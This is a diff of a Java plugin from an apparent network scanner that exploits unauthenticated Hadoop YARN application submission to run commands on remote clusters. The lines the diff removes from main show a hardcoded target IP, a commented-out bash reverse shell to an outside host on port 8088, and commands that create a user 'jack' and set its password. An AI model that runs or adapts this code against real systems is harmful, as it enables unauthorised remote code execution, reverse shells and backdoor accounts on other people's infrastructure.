@@ -10,6 +10,8 @@ import com.gbw.scanner.plugins.scripts.web.flink.FlinkHttpRequestBuilder;
 import com.gbw.scanner.sink.SinkQueue;
 import com.gbw.scanner.utils.HttpUtils;
 import com.xmap.api.utils.TextUtils;
+import org.apache.commons.cli.Options;
+import org.apache.commons.cli.ParseException;
 import org.apache.hadoop.conf.Configuration;
 import org.apache.hadoop.fs.CommonConfigurationKeysPublic;
 import org.apache.hadoop.yarn.api.ApplicationConstants;
@@ -183,6 +185,7 @@ public class GBWScanYarnScript implements GBWScanScript {
        return conf;
     }
 
+
     @Override
     public void scan(Host host, SinkQueue sinkQueue) {
 
@@ -206,16 +209,17 @@ public class GBWScanYarnScript implements GBWScanScript {
                 ApplicationSubmissionContext appContext = app.getApplicationSubmissionContext();
                 ApplicationId appId = appContext.getApplicationId();
                 YarnClusterMetrics clusterMetrics = yarnClient.getYarnClusterMetrics();
-
                 log.warn(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
-               //System.out.println(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
+                System.out.println(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
+
                 GBWScanYarnResult result = new GBWScanYarnResult(config,host);
                 result.setAppID(appId.toString());
                 result.setMaxMem(appResponse.getMaximumResourceCapability().getMemorySize());
                 result.setMaxVcores(appResponse.getMaximumResourceCapability().getVirtualCores());
                 result.setNodes(clusterMetrics.getNumNodeManagers());
 
-                sinkQueue.put(result);
+                if(sinkQueue!=null)
+                    sinkQueue.put(result);
 
                 if(config.isRunCmd()){
 
@@ -268,6 +272,7 @@ public class GBWScanYarnScript implements GBWScanScript {
             if (YarnApplicationState.FINISHED == state) {
                 if (FinalApplicationStatus.SUCCEEDED == dsStatus) {
                     //log.info("Application has completed successfully. Breaking monitoring loop");
+                    System.out.println("Application has completed successfully. Breaking monitoring loop");
                     return true;
                 }
                 else {
@@ -275,17 +280,21 @@ public class GBWScanYarnScript implements GBWScanScript {
                             + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                             + ". Breaking monitoring loop");
                     */
+                    System.out.println("Application did finished unsuccessfully."
+                            + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
+                            + ". Breaking monitoring loop");
+
                     return false;
                 }
             }
             else if (YarnApplicationState.KILLED == state
                     || YarnApplicationState.FAILED == state) {
-              /*
-                log.info("Application did not finish."
+
+                System.out.println("Application did not finish."
                         + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                         + ". Breaking monitoring loop");
 
-               */
+
                 return false;
             }
 
@@ -293,61 +302,27 @@ public class GBWScanYarnScript implements GBWScanScript {
             if (config.getTimeout() > 0
                     && System.currentTimeMillis() > (clientStartTime + config.getTimeout())) {
 
-                //log.info("Reached client specified timeout for application. " +
-                  //      "Killing application");
+                System.out.println("Reached client specified timeout for application. ");
 
-                //forceKillApplication(appId);
                 return false;
             }
         }
 
     }
 
-    public static void main(String[] args){
+    public static void main(String[] args) throws ParseException {
 
-        String ip = "154.210.72.15";
-        Host host = new Host(ip,ip,8088,null,null);
+        GBWScanYarnConfig config = GBWYarnUtils.createYarnConfig(args);
 
-        GBWScanYarnConfig config = new GBWScanYarnConfig();
-        config.setAppname("test");
-        config.setMemory(1024);
-        config.setMonitor(true);
-        config.setPriority(1);
-        config.setQueue("test");
-        config.setTimeout(100000);
-        config.setRunCmd(true);
-        config.setIpcRetries(2);
+        if(config!=null){
 
-        List<String> cmds = new ArrayList<>();
+            System.out.println(config);
 
-        config.setReadTimeout(10000);
-        config.setConTimeout(10000);
-
-        config.setUri("/cluster");
-        List<String> keys = new ArrayList<>();
-        keys.add("/cluster/nodes");
-        keys.add("All Applications");
-        config.setKeys(keys);
+            Host host = new Host(config.getAddr(),config.getAddr(),8088,null,null);
+            new GBWScanYarnScript(config).scan(host,null);
+        }
 
 
-        //cmds.add("/bin/bash -i >& /dev/tcp/128.199.250.129/8088 0>&1");
-        cmds.add("sudo /usr/sbin/useradd jack");
-        /*
-        cmds.add("sh");
-        cmds.add("-c");
-        cmds.add("echo jack:123456|chpasswd");
-        */
-        config.setCmds(cmds);
-
-
-        config.setVcores(1);
-
-        config.setUser("test");
-
-        GBWScanYarnScript scanYarnScript = new GBWScanYarnScript(config);
-        //System.out.println(scanYarnScript.isAccept(host));
-
-        scanYarnScript.scan(host,null);
     }
 
 }
